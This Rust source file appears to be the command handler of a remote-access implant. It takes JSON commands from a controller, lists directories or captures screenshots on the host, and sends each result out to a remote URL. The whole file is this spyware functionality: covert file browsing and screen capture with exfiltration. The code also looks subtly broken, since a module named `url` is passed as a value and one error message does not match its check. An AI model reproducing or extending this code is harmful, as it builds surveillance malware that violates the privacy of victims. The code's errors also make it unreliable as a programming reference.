use crate::utils;
use crate::listdir;
use serde_json::Value;
use crate::{Response, Response2};
use crate::requests;
use crate::url;
use reqwest::Method;
use crate::screencapture;


pub fn filter_command(message:&Value){
    let  mut command:&str  ="";
    let mut  id:&str ="";
    if let Some(command_type) = utils::get_string_from_json(&message, "type") {
        if command_type.to_lowercase()=="command"{
            if let Some(r_command) = utils::get_string_from_json(&message, "command"){
                command= r_command;
            } 
            if let Some(r_id) = utils::get_string_from_json(&message, "commandid"){
                id= r_id;
            } 

            if !command.is_empty() && !id.is_empty(){
                
                if command.starts_with("list "){
                    command = command.strip_prefix("list ").unwrap_or(&command);
                    println!("the command is list command {}", command );
                    let (response, result) = listdir::list_dir(command);
                    let final_response = Response{
                        response :response,
                        id:String::from(id)
                    };            
                    requests::send_json_request(Method::GET, url, Some(&final_response));
                    let result_response= Response2{
                        result:result,
                        id:String::from(id)
                    };
                    requests::send_json_request(Method::GET, url, Some(&result_response));
                    
                }
                else if command.starts_with("screenshot") {
                    println!("the command is screenshot command {}", command);
                    let (response, result) = screencapture::capture();
                    let final_response = Response{
                        response: response,
                        id: String::from(id)
                    };
                    requests::send_json_request(Method::GET, url, Some(&final_response));
                    let result_response = Response2{
                        result: result,
                        id: String::from(id)
                    };
                    requests::send_json_request(Method::GET, url, Some(&result_response));
                } else {
                    println!("Unknown command: {}", command);
                }
            }
        }
    } else {
        println!("No title found in the response.");
    }
}